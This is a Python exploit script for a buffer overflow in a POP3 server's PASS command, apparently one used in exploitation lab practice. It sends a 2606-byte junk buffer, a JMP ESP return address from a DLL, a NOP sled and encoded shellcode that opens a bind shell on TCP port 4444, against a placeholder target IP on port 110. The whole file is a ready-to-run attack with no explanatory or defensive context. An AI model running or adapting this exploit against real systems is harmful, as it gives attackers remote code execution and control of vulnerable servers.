#!/usr/bin/env python
import socket

#junk bytes to overflow buffer
junk = "\x41" * 2606

#jmp esp found by mona in slmgcr.dll 5f4a358f
jmp = "\x8F\x35\x4A\x5F"

nop = "\x90" * 30

#shellcode tcp bind on port 4444
buf =  b""
buf += b"\xda\xce\xbb\x05\x30\xbc\x80\xd9\x74\x24\xf4\x5e\x31"
buf += b"\xc9\xb1\x53\x83\xc6\x04\x31\x5e\x13\x03\x5b\x23\x5e"
buf += b"\x75\x9f\xab\x1c\x76\x5f\x2c\x41\xfe\xba\x1d\x41\x64"
buf += b"\xcf\x0e\x71\xee\x9d\xa2\xfa\xa2\x35\x30\x8e\x6a\x3a"
buf += b"\xf1\x25\x4d\x75\x02\x15\xad\x14\x80\x64\xe2\xf6\xb9"
buf += b"\xa6\xf7\xf7\xfe\xdb\xfa\xa5\x57\x97\xa9\x59\xd3\xed"
buf += b"\x71\xd2\xaf\xe0\xf1\x07\x67\x02\xd3\x96\xf3\x5d\xf3"
buf += b"\x19\xd7\xd5\xba\x01\x34\xd3\x75\xba\x8e\xaf\x87\x6a"
buf += b"\xdf\x50\x2b\x53\xef\xa2\x35\x94\xc8\x5c\x40\xec\x2a"
buf += b"\xe0\x53\x2b\x50\x3e\xd1\xaf\xf2\xb5\x41\x0b\x02\x19"
buf += b"\x17\xd8\x08\xd6\x53\x86\x0c\xe9\xb0\xbd\x29\x62\x37"
buf += b"\x11\xb8\x30\x1c\xb5\xe0\xe3\x3d\xec\x4c\x45\x41\xee"
buf += b"\x2e\x3a\xe7\x65\xc2\x2f\x9a\x24\x8b\x9c\x97\xd6\x4b"
buf += b"\x8b\xa0\xa5\x79\x14\x1b\x21\x32\xdd\x85\xb6\x35\xf4"
buf += b"\x72\x28\xc8\xf7\x82\x61\x0f\xa3\xd2\x19\xa6\xcc\xb8"
buf += b"\xd9\x47\x19\x54\xd1\xee\xf2\x4b\x1c\x50\xa3\xcb\x8e"
buf += b"\x39\xa9\xc3\xf1\x5a\xd2\x09\x9a\xf3\x2f\xb2\xb5\x5f"
buf += b"\xb9\x54\xdf\x4f\xef\xcf\x77\xb2\xd4\xc7\xe0\xcd\x3e"
buf += b"\x70\x86\x86\x28\x47\xa9\x16\x7f\xef\x3d\x9d\x6c\x2b"
buf += b"\x5c\xa2\xb8\x1b\x09\x35\x36\xca\x78\xa7\x47\xc7\xea"
buf += b"\x44\xd5\x8c\xea\x03\xc6\x1a\xbd\x44\x38\x53\x2b\x79"
buf += b"\x63\xcd\x49\x80\xf5\x36\xc9\x5f\xc6\xb9\xd0\x12\x72"
buf += b"\x9e\xc2\xea\x7b\x9a\xb6\xa2\x2d\x74\x60\x05\x84\x36"
buf += b"\xda\xdf\x7b\x91\x8a\xa6\xb7\x22\xcc\xa6\x9d\xd4\x30"
buf += b"\x16\x48\xa1\x4f\x97\x1c\x25\x28\xc5\xbc\xca\xe3\x4d"
buf += b"\xcc\x80\xa9\xe4\x45\x4d\x38\xb5\x0b\x6e\x97\xfa\x35"
buf += b"\xed\x1d\x83\xc1\xed\x54\x86\x8e\xa9\x85\xfa\x9f\x5f"

#TCP socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


#connect and exploit
s.connect(('{Target IP}',110))
received = s.recv(1024)
print received
s.send("USER test\r\n")
s.recv(1024)
s.send("PASS " + junk + jmp + nop + buf + '\r\n')
s.recv(1024)
s.close()
